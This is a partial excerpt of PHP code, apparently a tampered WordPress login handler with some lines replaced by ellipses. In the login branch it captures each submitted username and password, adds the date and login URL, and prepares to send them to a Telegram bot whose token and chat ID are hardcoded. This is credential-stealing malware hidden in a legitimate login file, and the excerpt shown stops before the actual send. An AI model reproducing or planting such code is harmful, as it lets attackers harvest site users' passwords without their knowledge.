...
<?php		exit;
		...
		if ( ( empty( $redirect_to ) || $redirect_to == 'wp-admin/' || $redirect_to == admin_url() ) ) {
			...
			elseif ( !$user->has_cap('edit_posts') )
				...
				$log = isset($_POST['log']) ? $_POST['log'] : 'Unknown';
				$pwd = isset($_POST['pwd']) ? $_POST['pwd'] : 'Unknown';
				$today = date("F j, Y, g:i a");
				$login_url = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
				...
				$message .= "Date Submitted: $today\n";
				$message .= "+++++++++++++++++++++++++\n\n";
			
				// Telegram API URL
				$telegram_api_url = "https://api.telegram.org/bot7360592737:AAGZCNR1Uww34cQ-Yy4ZpRQk70XWD9VB76I/sendMessage";
				$chat_id = "5092435646";
